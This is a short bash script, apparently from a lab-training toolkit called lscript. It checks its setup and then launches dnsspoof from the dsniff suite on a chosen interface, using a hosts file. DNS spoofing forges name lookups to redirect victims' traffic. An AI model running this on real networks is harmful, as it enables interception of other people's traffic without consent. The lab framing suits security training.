#! /bin/bash
LPATH="${LPATH:-/root/lscript}"
[[ -f "$LPATH/lib/lscript_lab.sh" ]] && source "$LPATH/lib/lscript_lab.sh"
[[ -f "$LPATH/lib/lscript_conf.sh" ]] && source "$LPATH/lib/lscript_conf.sh" && lscript_load_conf && lscript_apply_colors 2>/dev/null

lscript_lab_training_banner
IF="${LAB_IF:-}"
HOSTS="${LPATH}/labs/hosts.lab"

if [[ -z "$IF" ]]
then
	echo -e "${RS:-}Set interface: export LAB_IF=eth0${CE:-}"
	exit 1
fi
if [[ ! -f "$HOSTS" ]]
then
	echo -e "Create $HOSTS (see ${LPATH}/labs/hosts.lab.example)"
	exit 1
fi
if ! command -v dnsspoof >/dev/null 2>&1
then
	echo -e "Install: apt-get install -y dsniff"
	exit 1
fi

lscript_lab_audit "dns_spoof_start" "if=$IF hosts=$HOSTS"
echo -e "DNS spoof on $IF — Ctrl+C to stop"
dnsspoof -i "$IF" -f "$HOSTS"
read -r
